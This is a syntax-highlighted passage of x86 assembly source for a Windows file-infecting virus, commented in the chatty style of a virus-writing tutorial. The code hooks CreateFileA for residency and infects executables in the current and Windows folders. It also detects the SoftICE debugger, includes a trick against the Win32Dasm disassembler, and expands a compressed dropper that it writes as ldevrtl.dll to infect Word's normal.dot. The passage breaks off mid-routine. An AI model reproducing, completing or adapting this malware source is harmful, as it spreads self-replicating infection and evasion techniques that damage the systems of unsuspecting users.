        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">expcount</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">nexports</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">retHost</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">searchl</span><span class="sc0">
</span><span class="sc5">fFound</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ordinals</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">address</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">expcount</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ENDAPI</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">searchl</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; softice detection</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; for win9x</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000003h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">checkSice</span><span class="sc0">
</span><span class="sc5">siwin9x</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'\\.\SICE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sicemod</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">siwin9x</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'\\.\NTICE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">checkSice</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CreateFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,-</span><span class="sc2">0bff7h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">win9xDet</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc5">sicemod</span><span class="sc0">
</span><span class="sc5">win9xDet</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CreateFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; open file</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">notSice</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">                               </span><span class="sc1">; if found... fault!</span><span class="sc0">
</span><span class="sc5">win32dasm0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">win32dasm1</span><span class="sc0">                      </span><span class="sc1">; avoid brute dissasm</span><span class="sc0">
                                                </span><span class="sc1">; (some versions)</span><span class="sc0">
        </span><span class="sc1">; hehe lemme explain this. I've noticed in the past</span><span class="sc0">
        </span><span class="sc1">; win32dasm will enter a infinite loop if you put this:</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">; one: jmp two</span><span class="sc0">
        </span><span class="sc1">; two: jmp one</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">; Of coz program flow won't enter there... Just for some</span><span class="sc0">
        </span><span class="sc1">; win32dasm versions.</span><span class="sc0">
</span><span class="sc5">notSice</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">multiThread</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; set to free</span><span class="sc0">
        </span><span class="sc1">; per-process residency... Hook CreateFileA if available</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CreateFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CFAhookRet</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">; setup CreateFileA</span><span class="sc0">
                                                </span><span class="sc1">; ret addr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">400000h</span><span class="sc0">                     </span><span class="sc1">; this is setup at</span><span class="sc0">
</span><span class="sc5">baseAddr</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                         </span><span class="sc1">; inf time</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">CreateFileAHook</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">APIHook</span><span class="sc0">                         </span><span class="sc1">; hook CreateFileA</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">infWord</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; infect current folder</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infectFolder</span><span class="sc0">

        </span><span class="sc1">; infect windows folder</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">buffer0</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">; get current directory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAXSTRING</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">chuchu</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAXSTRING</span><span class="sc0">                       </span><span class="sc1">; get windows directory</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">buffer1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GetWindowsDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">chuchu</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">buffer1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">; goto windows directory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">chuchu</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infectFolder</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">buffer0</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">; go back home</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">infWord</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">infWord</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; check if we must infect</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">installMacros</span><span class="sc0">                   </span><span class="sc1">; word</span><span class="sc0">
</span><span class="sc5">chuchu</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">infWord</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; enable word infection for</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">retHost</span><span class="sc0">                         </span><span class="sc1">; per-process infected files</span><span class="sc0">

</span><span class="sc5">installMacros</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; begin wm infection code</span><span class="sc0">
        </span><span class="sc1">; 1st we need to expand the dropper to be able to infect it</span><span class="sc0">
        </span><span class="sc1">; alternate way to get memory... i know i can add this size</span><span class="sc0">
        </span><span class="sc1">; to virtual mem, or use stack, but i've thought i can</span><span class="sc0">
        </span><span class="sc1">; show ya this way to get mem.</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; get some mem</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; dropper size=1036 bytes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1036</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CreateFileMappingA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">retHost</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHnd2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; map a view for the obj</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000004h</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_MapViewOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">retHost</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mHnd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">; the dropper does nothing but end the app, it's assembled</span><span class="sc0">
        </span><span class="sc1">; with nasm (alink links it in a very tiny file)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">; i've implemented a RLE compression algorithm very</span><span class="sc0">
        </span><span class="sc1">; close to PCX compession with little improvements</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">; plain file: 1036 bytes (nasm+alink rockz!)</span><span class="sc0">
        </span><span class="sc1">; compressed:  245 bytes (uh uh)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">; Is fast, clean and in this case archieves a good</span><span class="sc0">
        </span><span class="sc1">; compression ratio. Expand code is also small :)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; expand the RLEed</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1036</span><span class="sc0">                        </span><span class="sc1">; dropper</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">drop</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">expandLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">128</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">expRep</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">127</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">expandLoop</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">endExpand</span><span class="sc0">
</span><span class="sc5">expRep</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">127</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">expandLoop</span><span class="sc0">
</span><span class="sc5">endExpand</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; here ends the expand code :)</span><span class="sc0">
        </span><span class="sc1">; why to not copy &amp; paste this code? hehe fuck! understand it.</span><span class="sc0">
        </span><span class="sc1">; is pretty easy RLE compression, and may be you would like</span><span class="sc0">
        </span><span class="sc1">; to improve it for your spezial case. Moreover i've not</span><span class="sc0">
        </span><span class="sc1">; included the code to compress the dropper hehehe.</span><span class="sc0">
        </span><span class="sc1">; uhm however you can use my compressed dropper and the code</span><span class="sc0">
        </span><span class="sc1">; to uncompress it, of coz.</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAXSTRING</span><span class="sc0">                       </span><span class="sc1">; get windows directory</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">buffer0</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GetWindowsDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">retHost</span><span class="sc0">        

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">tmpfilename</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">buffer0</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_lstrcat</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; spawn it to disk at '&lt;WINDOWS FOLDER&gt;/ldevrtl.dll'</span><span class="sc0">
        </span><span class="sc1">; if this fails... well it's a flag. I assume it is there and</span><span class="sc0">
        </span><span class="sc1">; we've infected normal.dot yet.</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000080h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40000000h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">buffer0</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CreateFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">skipSpawn</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; save file handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">; write it all</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">address</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; shit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1036</span><span class="sc0">                            </span><span class="sc1">; size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mHnd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; buffer to write</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; file handle</span><span class="sc0">
